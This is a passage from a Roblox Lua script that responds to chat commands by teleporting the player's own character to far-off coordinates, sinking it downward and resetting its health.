  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-29645.6641, 2647586.5, 16135477, -0.989213824, 0.00574239623, 0.146365836, 0.005804908, 0.999983132, -2.75625993e-08, -0.146363363, 0.00084961293, -0.989230514)
 end
 
 
 
 if msg:lower():sub(1,13) == "/e banlands" then
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-99999999, 2647586.5, 16135477, -0.989213824, 0.00574239623, 0.146365836, 0.005804908, 0.999983132, -2.75625993e-08, -0.146363363, 0.00084961293, -0.989230514)
 end
 
 if msg:lower():sub(1,13) == "/e hell" then
  tweenService, tweenInfo = game:GetService("TweenService"), TweenInfo.new(300, Enum.EasingStyle.Linear)

tween = tweenService:Create(game:GetService("Players")["LocalPlayer"].Character.HumanoidRootPart, tweenInfo, {CFrame = CFrame.new(0, -1000, 0)})
tween:Play()
wait(5)
game.Players.LocalPlayer.Character.Humanoid.Health = 0
 end
 
 
 
 if msg:lower():sub(1,13) == "/e god" then
